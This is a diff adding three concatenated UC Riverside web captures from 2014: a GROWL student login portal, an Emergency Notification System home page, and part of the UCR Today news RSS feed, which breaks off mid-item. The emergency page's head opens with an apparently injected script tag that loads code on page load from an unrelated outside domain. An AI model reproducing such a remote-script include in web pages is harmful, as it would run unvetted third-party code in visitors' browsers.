@@ -1,0 +1,1714 @@
+<html>
+ <head> 
+  <title>GROWL</title> 
+  <link rel="stylesheet" type="text/css" href="https://ucribm.ucr.edu/Paws/stylesheet_new.css" /> 
+ </head> 
+ <body bgcolor="#ffffff" marginwidth="0" marginheight="0" topmargin="0" leftmargin="0"> 
+  <!-- Top Bar for UCR logos --> 
+  <table width="100%" border="0" cellpadding="0" cellspacing="0"> 
+   <tbody>
+    <tr> 
+     <td bgcolor="#102044"><img src="/Paws/transparent_pixel.gif" width="1" height="1" alt="" border="0" /></td> 
+     <td width="100%" align="center" bgcolor="#102044"><a href="http://www.ucr.edu"><img src="/Paws/topbar_ucr_bar.gif" width="539" height="17" alt="University of California, Riverside" border="0" /></a></td> 
+     <td align="right" bgcolor="#102044"><a href="http://www.ucr.edu"> <img src="/Paws/topbar_ucr_logo.gif" width="37" height="17" alt="UCR" border="0" /></a></td> 
+    </tr> 
+    <tr> 
+     <td colspan="3" bgcolor="#ffffff"><img src="/Paws/transparent_pixel.gif" width="1" height="1" alt="" border="0" /></td> 
+    </tr> 
+   </tbody>
+  </table> 
+  <!-- Top Bar for Growl Login --> 
+  <table width="100%" border="0" cellpadding="0" cellspacing="0"> 
+   <tbody>
+    <tr> 
+     <td><img src="/Paws/login_topbar_growl_login.gif" width="415" height="82" alt="GROWL login" border="0" /></td> 
+     <td width="100%" background="/Paws/login_topbar_growl_login_stretch.gif"><img src="/Paws/transparent_pixel.gif" width="1" height="1" alt="" border="0" /></td> 
+     <td><img src="/Paws/login_topbar_growl_bear.gif" width="260" height="82" alt="GROWL login" border="0" /></td> 
+    </tr> 
+   </tbody>
+  </table> 
+  <!-- Horizontal rule (gold) --> 
+  <p align="center"></p>
+  <table width="90%" border="0" cellpadding="0" cellspacing="0">
+   <tbody>
+    <tr>
+     <td width="90%" bgcolor="#FFBA00"><img src="/Paws/transparent_pixel.gif" width="1" height="1" alt="" border="0" /></td>
+    </tr>
+   </tbody>
+  </table>
+  <p></p> 
+  <!-- 3 column table for gutter(1), content(2), gutter(3) --> 
+  <table width="100%" border="0" cellpadding="5" cellspacing="5"> 
+   <tbody>
+    <tr> 
+     <td width="33%" class="SubHeading">
+      <div align="center">
+       UCR Students
+       <br /> Get Caught in R'Web!
+      </div></td> 
+     <td width="33%" class="SubHeading">
+      <div align="center">
+       New and Past Students with no
+       <br /> Netid Log Directly in to Growl!
+      </div></td> 
+     <td class="SubHeading">
+      <div align="center">
+       Non-Student Growl Authorized Users
+      </div></td> 
+    </tr> 
+    <tr> 
+     <td valign="top">In R'Web you can connect to your<strong> Facebook account</strong> -- socialize and take care of UCR business all at the same time! Access your most important UCR applications, like <strong>Growl, Webmail, iLearn, Schedule of Classes </strong> -- get special <strong>Alerts</strong> about fees and due dates and <strong>&quot;Shout-Outs&quot;</strong> that'll tell you what's happening on campus</td> 
+     <td valign="top">If you are a new student needing to retrieve your Net ID, alumni, or past student, you can login to Growl directly using your student ID number, permanent PIN, and birth date.</td> 
+     <td valign="top">If you are a parent, guardian, or other authorized user you can login to Growl using the student's student ID number and birth date, and your assigned PIN.</td> 
+    </tr> 
+    <tr> 
+     <td>
+      <div align="center">
+       <a href="http://rweb.ucr.edu"> <img src="http://ucribm.ucr.edu/growl/images/genaimage.gif" alt="R Web" width="171" height="136" border="0" align="middle" /></a>
+      </div></td> 
+     <td>
+      <div align="center">
+       <a href="http://ucribm.ucr.edu/Paws/Growl.html"> <img src="https://ucribm.ucr.edu/growl/images/growlnew.jpg" alt="Growl login page" width="216" height="106" border="0" align="middle" /></a>
+      </div></td> 
+     <td>
+      <div align="center">
+       <a href="http://ucribm.ucr.edu/Paws/PAWSAuth.html"> <img src="https://ucribm.ucr.edu/growl/images/growlauth.jpg" alt="Growl authorized users login" border="0" align="middle" width="216" height="93" /></a>
+      </div></td> 
+    </tr> 
+    <tr> 
+     <td class="MainBody">
+      <div>
+       Customize your homepage and get real-time traffic reports, the UCR shuttle schedule, and much more! 
+       <br />
+       <b> <a href="http://rweb.ucr.edu" class="style1">Log in now and get caught in R'Web</a></b>
+      </div></td> 
+     <td class="MainBody">
+      <div align="center">
+       <b>Login to <a href="https://ucribm.ucr.edu/Paws/Growl.html"> Growl</a>&nbsp; now</b>
+      </div></td> 
+     <td class="MainBody">
+      <div align="center">
+       <b>Login to <a href="http://ucribm.ucr.edu/Paws/PAWSAuth.html" class="style1"> Growl Authorized Users</a>&nbsp; now</b>
+      </div></td> 
+    </tr>
+   </tbody>
+  </table>
+  <br /> 
+  <table width="100%" border="0" cellpadding="5" cellspacing="5"> 
+   <tbody>
+    <tr> 
+     <td class="MainBody"> <img src="/Paws/transparent_pixel.gif" width="10" height="1" alt="" border="0" /></td> 
+     <td width="100%"> 
+      <!-- <p align="center">Please send any questions or comments to the <a
+   href="mailto:reghelpdesk@pop.ucr.edu">Registrar's Office</a>.<br>Help
+   Line: (951) 827-2307</p>   --> <p align="center">GROWL Log in Issues Help Line: (951) 827-7284<br /> <a href="http://registrar.ucr.edu" target="blank">Office of the Registrar</a> (Enrollment Issues): (951) 827-7284<br /> <a href="http://finaid.ucr.edu/" target="blank">Financial Aid Office</a>: (951) 827-3878<br /> <a href="http://www.sbs.ucr.edu/" target="blank">Student Business Services</a>(Billing Questions): (951) 827-3204<br /> <a href="http://my.ucr.edu/admissions/Pages/AdmissionsOverview.aspx" target="blank"> Undergraduate Admissions Office</a>: (951) 827-3411</p> </td>
+    </tr> 
+   </tbody>
+  </table>   
+ </body>
+</html><!--?xml version="1.0" encoding="utf-8"?--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
+  <title>Emergency Notification System: Home</title> 
+  <meta http-equiv="last-modified" content="2011-09-12" /> 
+  <meta name="version" content="2.60 2.122 " /> 
+  <!-- 03/11/14 15:50:50 03/11/14 15:53:33 --> 
+  <!--link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/design6bis.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/wide6.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/blue6a.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/sifr.css" media="all" /--> 
+  <link type="text/css" rel="stylesheet" href="http://www.ucr.edu/min/g=6bis-bluea-narrow" media="all" /> 
+  <!--link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/print6.css" media="print" /--> 
+  <link type="text/css" rel="stylesheet" href="http://www.ucr.edu/min/f=css/print6.css" media="print" /> 
+  <link rel="stylesheet" type="text/css" href="/ens/css/local.css" media="all" /> 
+  <script type="text/javascript" src="http://www.ucr.edu/min/g=js-sifr"></script> 
+  <!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie6-wide6.css" media="all" />
+<script defer type="text/javascript" src="http://www.ucr.edu/min/f=pngfix.js"></script>
+<![endif]--> 
+  <!--[if lte IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie7.css" media="all" />
+<script type="text/javascript" src="http://www.ucr.edu/min/f=fixiequotes.js"></script>
+<![endif]--> 
+  <script type="text/javascript" src="/highslide/highslide-full.packed.js"></script> 
+  <script type="text/javascript" src="/highslide/highslide.config.js" charset="utf-8"></script> 
+  <link rel="stylesheet" type="text/css" href="/highslide/highslide.css" /> 
+ </head> 
+ <body> 
+  <div class="pagewrapper"> 
+   <ul id="accessibility_links"> 
+    <li class="skip"><a tabindex="1" href="#main" accesskey="2" title="Skip Navigation">Skip Navigation</a></li> 
+    <li class="skip"><a tabindex="2" href="http://cnc.cmsdev.ucr.edu/ens" accesskey="1" title="Home Page">Home Page</a></li> 
+   </ul> 
+   <hr /> 
+   <div id="brandingbar"> 
+    <img class="overlay" src="/ens/images/design6/overlay_home.png" alt="" /> 
+    <h1><a href="http://www.ucr.edu/" title="UCR Home Page"><img src="http://www.ucr.edu/images/design6/ucr_logo.gif" width="150" height="53" alt="" /><span class="accessibility">University of California, Riverside</span></a></h1> 
+   </div> 
+  </div> 
+  <div id="masthead" style="background-image:url(/ens/images/masthead.jpg);"> 
+   <h1><a href="http://cnc.cmsdev.ucr.edu/ens"><span class="printonly">Emergency Notification System</span></a></h1> 
+  </div> 
+  <!-- Status: Normal --> 
+  <hr /> 
+  <div class="breadcrumbs"> 
+   <p class="accessibility">You are here:</p> 
+   <ul> 
+    <li><a href="http://www.ucr.edu/" title="UCR Home">UCR Home</a> &gt;</li> 
+    <li><a href="http://cnc.ucr.edu/">Computing &amp; Communications</a> &gt;</li> 
+    <li class="lastitem">Emergency Notification System</li> 
+   </ul> 
+  </div> 
+  <div class="pagewrapper"> 
+   <div id="search"> 
+    <div id="nav_utility"> 
+     <ul> 
+      <li><a href="http://www.ucr.edu/alpha.html">A to Z Listing</a></li> 
+      <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+      <li><a href="http://www.ucr.edu/find_people.php">Find People</a></li> 
+     </ul> 
+    </div> 
+    <form id="searchbox" action="http://www.ucr.edu/search.php">
+     <p> <label for="SearchText" accesskey="4" title="Search">Search for:</label> <input type="text" size="18" maxlength="255" id="SearchText" name="q" value="" /> <input id="go" type="submit" name="sa" value="Go" /> </p>
+    </form> 
+    <script type="text/javascript" src="http://www.ucr.edu/js/watermark.js"></script> 
+   </div> 
+   <hr /> 
+   <!-- Start Content (Navigation and Content columns) --> 
+   <div id="content"> 
+    <h2>Home</h2> 
+    <!-- Start Sidebar --> 
+    <div id="sidebar"> 
+     <div class="nav"> 
+      <h3 class="accessibility">Main Navigation</h3> 
+      <ul> 
+       <li class="currentpage"><h3><dfn>Current page is: </dfn>Home</h3></li>
+       <li><a href="/ens/background.html" title="Background">Background<br /><span></span></a></li>
+       <li><a href="/ens/signup.html" title="How Do I Sign Up for the System?">How Do I Sign Up for the System?</a></li>
+       <li><a href="/ens/whenused.html" title="When Will The System Be Used?">When Will The System Be Used?</a></li>
+       <li><a href="/ens/privacy.html" title="Privacy &amp; Confidentiality">Privacy &amp; Confidentiality</a></li>
+       <li><a href="/ens/helpful_links.html" title="Helpful Links">Helpful Links</a></li>
+       <li><a href="/ens/faqs.html" title="Frequently Asked Questions">Frequently Asked Questions</a></li>
+       <li><a href="/ens/contacts.html" title="Contacts">Contacts</a></li>
+       <li><a href="/ens/announce.html" title="Announcements">Announcements<br /><span></span></a></li>
+       <li><a href="/ens/horizon.html" title="On the Horizon">On the Horizon</a></li> 
+      </ul> 
+     </div> 
+    </div> 
+    <hr /> 
+    <!-- End Sidebar --> 
+    <!-- Start Content Area --> 
+    <div id="main"> 
+     <!-- com.omniupdate.editor csspath="/z-omniupdate/css/macy.css" cssmenu="" width="790" --> 
+     <div class="header"> 
+      <!-- com.omniupdate.div label="title" group="Everyone" button="734" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="484" --> 
+      <!-- /com.omniupdate.div -->
+     </div> 
+     <div id="omnicontent"> 
+      <!-- com.omniupdate.div label="home-image" group="Everyone" button="727" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700" toolbar="IMG_ONLY" -->
+      <p><img alt="Emergency Notification System" height="141" src="/ens/images/ens_ucr_collage.jpg" width="493" /></p> 
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.div label="maincontent" group="Everyone" button="707" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700" --> 
+      <h3><strong><a href="/ens/announce.html">Important Announcement from <br />Associate Vice Chancellor Rowley</a></strong></h3> 
+      <p>The University of California Riverside is committed to providing a safe and secure environment to campus students, faculty, staff, and visitors. UCR engages in a broad array of activities supporting this goal, including comprehensive training for police and other safety related personnel, <a href="http://ehs.ucr.edu/emergency">disaster and emergency preparedness</a> planning, as well as a host of other activities aimed at preventing problems before they occur.</p> 
+      <p>To enhance UCR's <a href="http://ehs.ucr.edu/emergency">emergency preparedness</a>, the campus has launched a new emergency communications system. This new system will build on existing methods of information distribution and communication, and will greatly expand UCR's ability to quickly and reliably communicate with students, staff, and faculty in an emergency.</p> 
+      <p>The initial deployment of the new system will focus on emergency text messaging. In a crisis, this mode of communication will serve as a reliable tool enabling UCR police and safety personnel to contact the entire campus community. Future enhancements will include the ability to deliver messages to instant messaging accounts, campus digital displays, voice mail boxes, and a wide variety of other personal and business communications devices.</p> 
+      <p>UCR encourages everyone on campus to sign up for this new emergency notification service, and also to become aware of the various programs, initiatives, and practices already in place aimed at making the campus the as safe and secure as possible.</p> 
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.div label="related" group="Everyone" button="707" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="300" --> 
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.efp -->
+      <!-- /com.omniupdate.efp --> 
+     </div> 
+    </div> 
+    <!-- End Content Area --> 
+    <div class="clear"></div> 
+   </div> 
+   <!-- End Content --> 
+  </div> 
+  <div class="clear"></div> 
+  <div class="footerwrapper"> 
+   <h2><span class="accessibility">More Information</span>&nbsp;</h2> 
+   <div class="pagewrapper"> 
+    <div class="prefooter"> 
+     <div class="column49"> 
+      <h3>General Campus Information</h3> 
+      <address> <span class="vcard"> <strong><span class="fn org">University of California, Riverside</span></strong><br /> <span class="adr"> <span class="street-address">900 University Ave.</span><br /> <span class="locality">Riverside</span>, <span class="region">CA</span> <span class="postal-code">92521</span><br /> </span> Tel: <span class="tel">(951) 827-1012</span> </span> </address> 
+      <ul class="footer_links"> 
+       <li><a href="http://library.ucr.edu/">UCR Libraries</a></li> 
+       <li><a href="http://campusstatus.ucr.edu/">Campus Status</a></li> 
+       <li><a href="http://campusstore.ucr.edu/">Campus Store</a></li> 
+       <li><a href="http://www.ucr.edu/employment.html">Career Opportunities</a></li> 
+       <li><a href="http://diversity.ucr.edu/">Diversity</a></li> 
+       <li><a href="http://www.ucr.edu/about/directions.html">Maps and Directions</a></li> 
+       <li><a href="http://admissions.ucr.edu/VisitUCR">Visit UCR</a></li> 
+      </ul> 
+     </div> 
+     <div class="column49"> 
+      <h3>Department Information</h3> 
+      <address><strong>Computing &amp; Communications</strong><br /> <a href="http://www.campusmap.ucr.edu/campusMap.php?loc=CCCTR" title="Campus Map">Computing &amp; Communications Bldg.</a><br /><br /> Tel: (951) 827-4741<br /> Fax: (951) 827-4541<br />E-mail: <a href="mailto:emergencynotification@ucr.edu?subject=Web Site Inquiry">emergencynotification@ucr.edu</a></address> 
+     </div> 
+     <div class="column49R"> 
+      <h3>Related Links</h3> 
+      <ul> 
+       <li><a href="http://campusstatus.ucr.edu">Campus Emergency Status</a></li> 
+       <li><a href="http://www.cnc.ucr.edu">Computing &amp; Communications</a></li> 
+       <li><a href="http://ehs.ucr.edu">Environmental Health &amp; Safety</a></li> 
+       <li><a href="http://www.police.ucr.edu">UCR Police Department</a></li> 
+      </ul> 
+      <ul class="footer_links"> 
+       <li><a id="footer_link_facebook" class="footer_link_icon" href="http://www.facebook.com/UCRiverside" title="external site: Facebook">Visit UCR’s Facebook page</a></li> 
+       <li><a id="footer_link_twitter" class="footer_link_icon" href="http://twitter.com/UCRiverside" title="external site: Twitter">Follow UCR on Twitter</a></li> 
+       <li><a id="footer_link_youtube" class="footer_link_icon" href="http://www.youtube.com/UCRiverside" title="external site: YouTube">Visit UCR’s YouTube channel</a></li> 
+      </ul> 
+     </div> 
+     <div class="clear"></div> 
+    </div> 
+    <div class="clear"></div> 
+    <div id="nav_footer"> 
+     <h3 class="accessibility">Campuswide Navigation</h3> 
+     <ul>
+      <li><a id="nav_footer_home" href="http://www.ucr.edu/"><span>Home</span></a></li>
+      <li><a id="nav_footer_about_ucr" href="http://www.ucr.edu/about/"><span>About UCR</span></a></li>
+      <li><a id="nav_footer_academics" href="http://www.ucr.edu/academics/"><span>Academics</span></a></li>
+      <li><a id="nav_footer_athletics" href="http://www.ucr.edu/athletics/"><span>Athletics</span></a></li>
+      <li><a id="nav_footer_happenings" href="http://www.ucr.edu/happenings/"><span>Happenings</span></a></li>
+      <li><a id="nav_footer_research" href="http://www.ucr.edu/research/"><span>Research</span></a></li>
+      <li><a id="nav_footer_resources" href="http://www.ucr.edu/resources/"><span>Campus Resources</span></a></li>
+      <li><a id="nav_footer_giving" href="http://www.ucr.edu/giving/"><span>Giving to UCR</span></a></li>
+     </ul> 
+    </div> 
+    <h3 class="accessibility">Footer</h3> 
+    <div id="footer"> 
+     <ul> 
+      <li><a href="http://cnc.cmsdev.ucr.edu/enssendmail.html" accesskey="9" title="Send Feedback E-mail">Feedback</a></li> 
+      <li><a href="http://www.ucr.edu/privacy.html">Privacy Policy</a></li> 
+      <li><a href="http://www.ucr.edu/terms.html" accesskey="8" title="Terms and Conditions">Terms and Conditions</a></li> 
+      <li>&copy; 2011 Regents of the University of California</li> 
+      <li><a rel="nofollow" href="http://ucrcmsdev.ucr.edu/oucampus/de.jsp?user=ORG21&amp;site=cnc&amp;path=%2Fens%2Findex.html">Last modified: 2011-Sep-12</a></li> 
+     </ul> 
+    </div> 
+   </div> 
+  </div> 
+  <script type="text/javascript">
+// <![CDATA[
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-3051875-1']);
+  _gaq.push(['_setDomainName', '.ucr.edu']);
+  _gaq.push(['_setAllowHash', false]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+// ]]>
+</script> 
+  <!-- Generated in 0.022675 seconds using 2.00 MiB of memory. -->   
+ </body>
+</html><!--?xml version="1.0" encoding="UTF-8"?-->
+<html>
+ <head></head>
+ <body>
+  <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" xmlns:media="http://search.yahoo.com/mrss/"> 
+   <channel> 
+    <title>UCR Today</title> 
+    <atom:link href="http://ucrtoday.ucr.edu/feed" rel="self" type="application/rss+xml" /> 
+    <link />http://ucrtoday.ucr.edu 
+    <description>
+     UC Riverside News and Happenings
+    </description> 
+    <lastbuilddate>
+     Tue, 11 Mar 2014 17:34:11 +0000
+    </lastbuilddate> 
+    <language>
+     en-US
+    </language> 
+    <sy:updateperiod>
+     hourly
+    </sy:updateperiod> 
+    <sy:updatefrequency>
+     1
+    </sy:updatefrequency> 
+    <generator>
+     http://wordpress.org/?v=3.8.1
+    </generator> 
+    <img /> 
+    <title>UCR Today</title> 
+    <url>
+     http://ucrtoday.ucr.edu/UCRmonogram.png
+    </url> 
+    <link />http://ucrtoday.ucr.edu 
+    <width>
+     115
+    </width> 
+    <height>
+     83
+    </height> 
+    <description>
+     UC Riverside News and Happenings
+    </description>  
+    <item> 
+     <title>Brain Awareness Day to Cover Sheep Brains, Cow Hearts, Scorpions and Zombie Cockroaches</title> 
+     <link />http://ucrtoday.ucr.edu/20966 
+     <comments>
+      http://ucrtoday.ucr.edu/20966#comments
+     </comments> 
+     <pubdate>
+      Tue, 11 Mar 2014 16:25:16 +0000
+     </pubdate> 
+     <dc:creator>
+      Iqbal Pittalwala
+     </dc:creator> 
+     <category>
+      Health
+     </category> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      Science/Technology
+     </category> 
+     <category>
+      brain
+     </category> 
+     <category>
+      Brain Awareness Day
+     </category> 
+     <category>
+      Brain Awareness Week
+     </category> 
+     <category>
+      Department of Cell Biology and Neuroscience
+     </category> 
+     <category>
+      Department of Psychology
+     </category> 
+     <category>
+      Fair
+     </category> 
+     <category>
+      Margarita Curras-Collazo
+     </category> 
+     <category>
+      Neuroscience Graduate Student Association
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      School of Medicine
+     </category> 
+     <category>
+      Zoe Thompson
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20966
+     </guid> 
+     <description>
+      Brain Awareness Day this year will take place on March 12 on the UC Riverside campus.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20966/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/BAD_2013-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/BAD_2013.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Susan Straight is a Southern California Original</title> 
+     <link />http://ucrtoday.ucr.edu/20960 
+     <comments>
+      http://ucrtoday.ucr.edu/20960#comments
+     </comments> 
+     <pubdate>
+      Tue, 11 Mar 2014 01:24:30 +0000
+     </pubdate> 
+     <dc:creator>
+      Kris Lovekin
+     </dc:creator> 
+     <category>
+      Arts/Culture
+     </category> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      andrew winer
+     </category> 
+     <category>
+      David Ulin
+     </category> 
+     <category>
+      Department of Creative Writing
+     </category> 
+     <category>
+      inland empire
+     </category> 
+     <category>
+      Los Angeles Times
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      Susan Straight
+     </category> 
+     <category>
+      writers
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20960
+     </guid> 
+     <description>
+      Susan Straight, a native of Riverside and a longtime professor of creative writing at UC Riverside, will receive the Kirsch Award for lifetime achievement at the awards ceremony for the Los Angeles Times Book Prizes. The event is Friday, April 11 at the University of Southern California’s Bovard Auditorium. 
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20960/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/58D7544_hero-e1394559178514-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/58D7544_hero.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>UCR to Host Inaugural BlaqOUT Conference on April 18-19, 2014</title> 
+     <link />http://ucrtoday.ucr.edu/20897 
+     <comments>
+      http://ucrtoday.ucr.edu/20897#comments
+     </comments> 
+     <pubdate>
+      Fri, 07 Mar 2014 20:03:59 +0000
+     </pubdate> 
+     <dc:creator>
+      Ross French
+     </dc:creator> 
+     <category>
+      Politics/Society
+     </category> 
+     <category>
+      african american students
+     </category> 
+     <category>
+      BlaqOUT Conference
+     </category> 
+     <category>
+      gabriel maldonado
+     </category> 
+     <category>
+      LGBT Center
+     </category> 
+     <category>
+      nancy tubbs
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      toi thibodeaux
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20897
+     </guid> 
+     <description>
+      The LGBT Resource Center at the University of California, Riverside will host the inaugural BlaqOUT Conference at the Highlander Union Building on April 18-19, 2014. The conference is for individuals who self-identify as Black/African American or of African descent and as Same Gender Loving, Lesbian, Gay, Bisexual, Transgender, Queer, Questioning or somewhere on the LGBT spectrum.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20897/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/blaqout_fb_cover_01-01-130x78.png" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/blaqout_fb_cover_01-01.png" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Green Leadership Summit Details Sustainability Efforts, Draws Influential Crowd</title> 
+     <link />http://ucrtoday.ucr.edu/20875 
+     <comments>
+      http://ucrtoday.ucr.edu/20875#comments
+     </comments> 
+     <pubdate>
+      Fri, 07 Mar 2014 01:19:26 +0000
+     </pubdate> 
+     <dc:creator>
+      Konrad Nagy
+     </dc:creator> 
+     <category>
+      Inside UCR
+     </category> 
+     <category>
+      CE-CERT
+     </category> 
+     <category>
+      Chancellor Kim A. Wilcox
+     </category> 
+     <category>
+      city of riverside
+     </category> 
+     <category>
+      green
+     </category> 
+     <category>
+      Green Riverside
+     </category> 
+     <category>
+      John Cook
+     </category> 
+     <category>
+      Matthew Barth
+     </category> 
+     <category>
+      Riverside Public Utilities
+     </category> 
+     <category>
+      Ron Loveridge
+     </category> 
+     <category>
+      rusty bailey
+     </category> 
+     <category>
+      sustainability
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20875
+     </guid> 
+     <description>
+      A vision of a greener future was on display at the UC Riverside Alumni and Visitor Center last week as the university, the City of Riverside and Riverside Public Utilities (RPU) partnered to host the second Green Leadership Summit on Feb. 26, 2014.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20875/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/Wilcox-and-Mayor-Bailey-at-Green-Summit-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/Wilcox-and-Mayor-Bailey-at-Green-Summit.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Gladys Eaton Dies at 92</title> 
+     <link />http://ucrtoday.ucr.edu/20889 
+     <comments>
+      http://ucrtoday.ucr.edu/20889#comments
+     </comments> 
+     <pubdate>
+      Tue, 04 Mar 2014 22:23:22 +0000
+     </pubdate> 
+     <dc:creator>
+      Bettye Miller
+     </dc:creator> 
+     <category>
+      Arts/Culture
+     </category> 
+     <category>
+      Eaton Collection
+     </category> 
+     <category>
+      Eaton Conference
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      science fiction
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20889
+     </guid> 
+     <description>
+      Gladys M. Eaton, whose husband’s collection of science fiction books formed the basis of UC Riverside’s Eaton Collection of Science Fiction and Fantasy, died Jan. 22. She was 92.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20889/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/Gladys-Eaton-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/Gladys-Eaton.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Combining Forces to Stop Hackers</title> 
+     <link />http://ucrtoday.ucr.edu/20879 
+     <comments>
+      http://ucrtoday.ucr.edu/20879#comments
+     </comments> 
+     <pubdate>
+      Tue, 04 Mar 2014 18:10:45 +0000
+     </pubdate> 
+     <dc:creator>
+      Sean Nealon
+     </dc:creator> 
+     <category>
+      Science/Technology
+     </category> 
+     <category>
+      Anirban Banerjee
+     </category> 
+     <category>
+      Bourns College of Engineering
+     </category> 
+     <category>
+      CloudFlare
+     </category> 
+     <category>
+      Matthew Prince
+     </category> 
+     <category>
+      Michalis Faloutsos
+     </category> 
+     <category>
+      press release
+     </category> 
+     <category>
+      StopTheHacker
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20879
+     </guid> 
+     <description>
+      StopTheHacker, an anti-malware company created by a graduate of the University of California, Riverside Bourns College of Engineering, has been bought by CloudFlare, the web performance and security company who protects more than 1.5 million web sites and sees five percent of Internet traffic worldwide.
+     </description> 
+     <wfw:commentrss>
+      http://ucrtoday.ucr.edu/20879/feed
+     </wfw:commentrss> 
+     <slash:comments>
+      0
+     </slash:comments> 
+     <media:thumbnail url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/AnirbanBanerjee-31-e1393974703661-130x78.jpg" /> 
+     <media:content url="http://ucrtoday.ucr.edu/wp-content/uploads/2014/03/AnirbanBanerjee-31.jpg" medium="image" /> 
+    </item> 
+    <item> 
+     <title>Century-old Music Mystery Solved</title> 
+     <link />http://ucrtoday.ucr.edu/20861 
+     <comments>
+      http://ucrtoday.ucr.edu/20861#comments
+     </comments> 
+     <pubdate>
+      Fri, 28 Feb 2014 18:41:10 +0000
+     </pubdate> 
+     <dc:creator>
+      Bettye Miller
+     </dc:creator> 
+     <category>
+      Arts/Culture
+     </category> 
+     <category>
+      Enrique Granados
+     </category> 
+     <category>
+      music
+     </category> 
+     <category>
+      opera
+     </category> 
+     <category>
+      press release
+     </category> 
+     <guid ispermalink="false">
+      http://ucrtoday.ucr.edu/?p=20861
+     </guid> 
+     <description>
+      What happened to an unpublished opera written by Enrique Granados, one of Spain’s greatest composers, at the turn of the 20th century? After a 20-year quest, UCR's Walter Clark found and acquired the original copy of &quot;Maria del Carmen.&quot;
+     </description> 
+     <wfw:commentrss>
